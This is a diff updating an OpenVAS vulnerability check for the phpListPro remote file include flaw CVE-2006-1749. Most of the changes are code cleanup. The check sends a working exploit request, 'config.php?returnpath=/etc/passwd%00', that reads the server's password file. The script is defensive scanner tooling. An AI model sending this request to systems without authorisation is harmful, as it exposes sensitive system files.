@@ -1,5 +1,5 @@
 # OpenVAS Vulnerability Test
-# $Id: phplistpro_remote_file_include.nasl 4489 2016-11-14 08:23:54Z teissa $
+# $Id: phplistpro_remote_file_include.nasl 5779 2017-03-30 06:57:12Z cfi $
 # Description: phpListPro returnpath Remote File Include Vulnerabilities
 #
 # Authors:
@@ -45,33 +45,25 @@ the privileges of the web server process.
 These flaws are only exploitable if PHP's 'register_globals' is
 enabled.";
 
-if (description) {
-  script_id(80077);;
-  script_version("$Revision: 4489 $");
-  script_tag(name:"last_modification", value:"$Date: 2016-11-14 09:23:54 +0100 (Mon, 14 Nov 2016) $");
+if(description)
+{
+  script_id(80077);
+  script_version("$Revision: 5779 $");
+  script_tag(name:"last_modification", value:"$Date: 2017-03-30 08:57:12 +0200 (Thu, 30 Mar 2017) $");
   script_tag(name:"creation_date", value:"2008-10-24 23:33:44 +0200 (Fri, 24 Oct 2008)");
   script_tag(name:"cvss_base", value:"7.5");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
   script_bugtraq_id(17448);
   script_cve_id("CVE-2006-1749");
   script_xref(name:"OSVDB", value:"24540");
-
-  name = "phpListPro returnpath Remote File Include Vulnerabilities";
-  script_name(name);
- 
- 
-  summary = "Checks for file includes in phpListPro's config.php";
- 
+  script_name("phpListPro returnpath Remote File Include Vulnerabilities");
   script_category(ACT_ATTACK);
   script_tag(name:"qod_type", value:"remote_vul");
   script_family("Web application abuses");
-
   script_copyright("This script is Copyright (C) 2006 Josh Zlatin-Amishav");
-
-  script_dependencies("http_version.nasl");
+  script_dependencies("find_service.nasl", "http_version.nasl");
   script_require_ports("Services/www", 80);
   script_exclude_keys("Settings/disable_cgi_scanning");
-
   script_tag(name : "summary" , value : tag_summary);
   script_tag(name : "solution" , value : tag_solution);
   script_xref(name : "URL" , value : "http://archives.neohapsis.com/archives/bugtraq/2006-04/0206.html");
@@ -81,33 +73,21 @@ if (description) {
   exit(0);
 }
 
-
-include("global_settings.inc");
 include("http_func.inc");
 include("http_keepalive.inc");
 
-
 port = get_http_port(default:80);
-if (!get_port_state(port)) exit(0);
 if (!can_host_php(port:port)) exit(0);
 
-
-# Loop through various directories.
-#
 # Google for '"PHPListPro Ver"|intitle:"rated TopList"'.
-dirs = make_list("/phplistpro", "/toplist", "/topsite", cgi_dirs());
+foreach dir( make_list_unique( "/phplistpro", "/toplist", "/topsite", cgi_dirs( port:port ) ) ) {
 
-foreach dir (dirs) {
+  if( dir == "/" ) dir = "";
+
   # Try to exploit the flaw in config.php to read /etc/passwd.
-  req = http_get(
-    item:string(
-      dir, "/config.php?",
-      "returnpath=/etc/passwd%00"
-    ), 
-    port:port
-  );
+  req = http_get( item:string(dir, "/config.php?returnpath=/etc/passwd%00" ), port:port );
   res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
-  if (res == NULL) exit(0);
+  if (res == NULL) continue;
 
   # There's a problem if...
   if (
@@ -131,3 +111,5 @@ foreach dir (dirs) {
     exit(0);
   }
 }
+
+exit( 99 );
